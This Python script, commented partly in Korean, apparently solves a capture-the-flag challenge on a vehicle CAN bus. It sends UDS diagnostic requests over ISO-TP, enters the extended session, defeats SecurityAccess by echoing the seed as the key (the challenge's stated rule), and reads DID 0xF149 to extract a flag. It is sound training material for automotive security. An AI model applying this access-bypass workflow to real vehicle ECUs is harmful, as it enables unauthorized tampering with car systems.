#!/usr/bin/env python3
# uds_read_f149.py
# Usage: sudo python3 uds_read_f149.py
# Requires: python-can (pip install python-can)

import time
import re
import can

BUS_CHANNEL = "can0"
BUSTYPE = "socketcan"
REQ_ID = 0x7A0          # Tester -> ECU (당신이 보낸 ID)
TIMEOUT = 2.0           # recv 대기 시간
RETRIES = 3

# ---------------- ISO-TP helpers ----------------
def sf_frame(payload: bytes) -> bytes:
    """Build Single Frame (<=7 bytes payload)"""
    if len(payload) > 7:
        raise ValueError("Payload too long for Single Frame")
    pci = (0x0 << 4) | len(payload)
    data = bytes([pci]) + payload
    return data + bytes(8 - len(data))

def send_fc_continue(bus: can.Bus) -> None:
    """
    Send Flow Control (Continue) to ECU.
    ISO-TP FC is sent in reverse direction (Tester->ECU), 즉 REQ_ID로 보냄.
    """
    # 0x30 = FC(Continue), BS=0 (무제한), STmin=0
    fc = bytes([0x30, 0x00, 0x00]) + bytes(5)
    bus.send(can.Message(arbitration_id=REQ_ID, data=fc, is_extended_id=False))

def recv_isotp_payload(bus: can.Bus, expect_service: int, timeout: float) -> bytes | None:
    """
    ISO-TP 수신 (ECU->Tester 방향). 필요시 FC를 전송한다.
    expect_service: 기대하는 응답 서비스 코드(예: 0x62, 0x67)
    반환: 순수 'service 바이트부터의 payload'(예: [0x62, DID_H, DID_L, data...])
    """
    end_time = time.time() + timeout
    assembled = bytearray()
    expected_len = None
    next_sn = 1  # CF sequence number expected

    while time.time() < end_time:
        r = bus.recv(timeout=max(0, end_time - time.time()))
        if r is None:
            break
        data = bytes(r.data)
        pci = data[0]
        ftype = (pci & 0xF0) >> 4

        if ftype == 0x0:
            # Single Frame
            ln = pci & 0x0F
            payload = data[1:1+ln]
            if not payload:
                continue
            if payload[0] == 0x7F:
                # Negative response
                return payload  # caller가 처리
            if payload[0] == expect_service:
                return payload
            # 다른 서비스면 계속 대기
        elif ftype == 0x1:
            # First Frame
            ln = ((pci & 0x0F) << 8) | data[1]
            expected_len = ln
            chunk = data[2:8]  # FF의 첫 페이로드 6B
            assembled.extend(chunk)
            # FF를 받았으면 즉시 FC 전송
            send_fc_continue(bus)
            # FF의 시작이 기대 서비스인지 확인(가능하면)
            if len(assembled) >= 1 and assembled[0] == 0x7F:
                return bytes(assembled[:min(len(assembled), expected_len)])
            # 이후 CF 수신으로 계속
            while len(assembled) < expected_len and time.time() < end_time:
                cf = bus.recv(timeout=max(0, end_time - time.time()))
                if cf is None:
                    break
                cfd = bytes(cf.data)
                cfpci = cfd[0]
                cftype = (cfpci & 0xF0) >> 4
                if cftype != 0x2:
                    continue  # 다음 프레임 대기
                sn = (cfpci & 0x0F)
                if sn != (next_sn & 0x0F):
                    # 시퀀스 불일치 → 안전하게 종료
                    break
                next_sn += 1
                assembled.extend(cfd[1:8])
            # 잘 모인 경우 자르기
            if expected_len is not None:
                assembled = assembled[:expected_len]
            # assembled는 service부터의 payload여야 함
            if not assembled:
                continue
            return bytes(assembled)
        else:
            # FlowControl(0x3) 혹은 기타 → 무시하고 계속
            continue
    return None

def send_and_recv(bus: can.Bus, payload: bytes, expect_service: int, timeout: float) -> bytes | None:
    """SF로 payload 전송 후 expect_service 응답 수신 (SF/FF 모두 처리)"""
    bus.send(can.Message(arbitration_id=REQ_ID, data=sf_frame(payload), is_extended_id=False))
    return recv_isotp_payload(bus, expect_service, timeout)

def pretty(b: bytes) -> str:
    return " ".join(f"{x:02X}" for x in b)

# ---------------- UDS steps ----------------
def enter_extended_session(bus: can.Bus) -> bool:
    print("[*] Entering extended session (0x10 0x03)")
    for _ in range(RETRIES):
        resp = send_and_recv(bus, bytes([0x10, 0x03]), expect_service=0x50, timeout=TIMEOUT)
        if resp is None:
            print("  - no response")
            continue
        if resp[0] == 0x7F:
            print(f"  [-] NRC on 0x10: {pretty(resp)}")
            continue
        if len(resp) >= 2 and resp[0] == 0x50 and resp[1] == 0x03:
            print("  [+] Extended session entered")
            return True
        print(f"  [.] unexpected: {pretty(resp)}")
    return False

def security_access_level_03(bus: can.Bus) -> bool:
    print("[*] SecurityAccess: request seed (0x27 0x03)")
    seed = None
    for _ in range(RETRIES):
        resp = send_and_recv(bus, bytes([0x27, 0x03]), expect_service=0x67, timeout=TIMEOUT)
        if resp is None:
            print("  - no response")
            continue
        if resp[0] == 0x7F:
            print(f"  [-] NRC on 0x27 03: {pretty(resp)}")
            continue
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x03:
            seed = resp[2:]
            print(f"  [+] Seed: {pretty(seed)} (len={len(seed)})")
            break
        print(f"  [.] unexpected: {pretty(resp)}")
    if not seed:
        return False

    # CTF 조건: key == seed
    key = seed
    if len(key) > 5:
        print("[!] Key length > 5B → 이 스크립트는 SF 전송만 지원. 필요시 ISOTP CF 송신 구현 필요.")
        return False

    print("[*] SecurityAccess: send key (0x27 0x04)")
    for _ in range(RETRIES):
        resp = send_and_recv(bus, bytes([0x27, 0x04]) + key, expect_service=0x67, timeout=TIMEOUT)
        if resp is None:
            print("  - no response")
            continue
        if resp[0] == 0x7F:
            print(f"  [-] NRC on 0x27 04: {pretty(resp)}")
            continue
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x04:
            print("  [+] SecurityAccess level 0x03 granted")
            return True
        print(f"  [.] unexpected: {pretty(resp)}")
    return False

def read_did_f149(bus: can.Bus) -> bytes | None:
    print("[*] Reading DID 0xF149 (0x22 F1 49)")
    for _ in range(RETRIES):
        resp = send_and_recv(bus, bytes([0x22, 0xF1, 0x49]), expect_service=0x62, timeout=TIMEOUT)
        if resp is None:
            print("  - no response")
            continue
        if resp[0] == 0x7F:
            print(f"  [-] NRC on 0x22 F149: {pretty(resp)}")
            continue
        # Positive: 0x62, DID high, DID low, then data...
        if len(resp) >= 3 and resp[0] == 0x62 and resp[1] == 0xF1 and resp[2] == 0x49:
            data = resp[3:]
            print(f"  [+] DID data ({len(data)}B): {pretty(data)}")
            return data
        print(f"  [.] unexpected: {pretty(resp)}")
    return None

def main():
    bus = can.interface.Bus(channel=BUS_CHANNEL, bustype=BUSTYPE)
    print(f"[+] Opened {BUS_CHANNEL} ({BUSTYPE}), REQ_ID=0x{REQ_ID:03X}")

    if not enter_extended_session(bus):
        print("[!] Failed to enter extended session. Abort.")
        return

    if not security_access_level_03(bus):
        print("[!] SecurityAccess L3 failed. Abort.")
        return

    did = read_did_f149(bus)
    if did is None:
        print("[!] Failed to read DID 0xF149.")
        return

    # Try ASCII decode and extract flag
    try:
        ascii_text = bytes(did).decode("ascii", errors="ignore")
    except Exception:
        ascii_text = ""

    print(f"[*] ASCII (best-effort): {ascii_text!r}")
    m = re.search(r"flag\{[^}]*\}", ascii_text)
    if m:
        print(f"[🎉] FLAG FOUND: {m.group(0)}")
    else:
        print("[i] No 'flag{...}' substring detected in ASCII. Check hex/length or encoding.")

if __name__ == "__main__":
    main()
